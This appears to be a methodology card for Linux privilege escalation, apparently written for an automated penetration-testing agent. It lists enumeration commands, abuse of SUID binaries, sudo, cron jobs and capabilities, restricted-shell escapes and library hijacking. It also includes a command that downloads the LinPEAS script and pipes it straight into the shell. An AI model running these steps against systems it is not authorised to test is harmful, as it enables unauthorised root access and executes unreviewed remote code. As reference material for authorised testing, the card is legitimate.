---
title: Linux Privilege Escalation
category: post_exploitation
applicable_techniques:
  - T1068
  - T1548.001
  - T1548.003
mitre_tactics:
  - TA0004
max_token_estimate: 800
---

## Attack Methodology

1. **Enumeration**: Gather system info — `uname -a`, `cat /etc/os-release`, `id`, `sudo -l`, `find / -perm -4000 2>/dev/null`
2. **SUID/SGID Abuse**: Find SUID binaries and check GTFOBins for exploitation paths.
3. **Sudo Misconfiguration**: Check `sudo -l` for NOPASSWD entries, wildcard injection, env_keep abuse.
4. **Kernel Exploits**: Match kernel version against known CVEs (DirtyPipe, DirtyCow, OverlayFS).
5. **Cron Jobs**: Check `/etc/crontab`, `/var/spool/cron/`, world-writable scripts in cron paths.
6. **Capabilities**: `getcap -r / 2>/dev/null` — look for `cap_setuid`, `cap_dac_override`.

## Bypass Techniques

- Restricted shell escape: `python -c 'import pty;pty.spawn("/bin/bash")'`, `vi :!/bin/sh`
- PATH hijacking: writable PATH directories, relative path in SUID binary
- Library hijacking: LD_PRELOAD, writable library paths in `/etc/ld.so.conf`

## Tool Usage Tips

- LinPEAS: `curl -L https://linpeas.sh | sh`
- GTFOBins: check each SUID binary at gtfobins.github.io
- pspy: monitor cron jobs and processes without root
